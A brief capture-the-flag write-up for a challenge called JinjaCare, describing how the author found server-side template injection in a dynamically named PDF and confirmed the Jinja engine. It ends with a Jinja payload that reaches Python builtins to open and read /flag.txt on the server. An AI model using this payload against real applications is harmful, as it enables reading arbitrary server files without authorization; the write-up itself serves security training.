# JinjaCare
At the beginning of this challenge I was looking for a API vulnerability, but I didn't found anything but I found a pdf with dynamic name: 
<img width="825" height="393" alt="image" src="https://github.com/user-attachments/assets/664a22e7-0b5e-4262-bdbe-6cbdf4e205a9" />

So, I tried to put ${{7*7} to found a SSTI vulnerability
<img width="765" height="278" alt="image" src="https://github.com/user-attachments/assets/d260ce46-fdc3-4856-9190-0b364d7cd623" />

So, with this output and withe the name of the challenges, I already know about the templae: JINJA
<img width="1440" height="943" alt="image" src="https://github.com/user-attachments/assets/4a7e0fd1-d9f7-4d15-b6f9-7ee3c03016a5" />

SO I tried to get the flag with this:
```bash
{{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
```
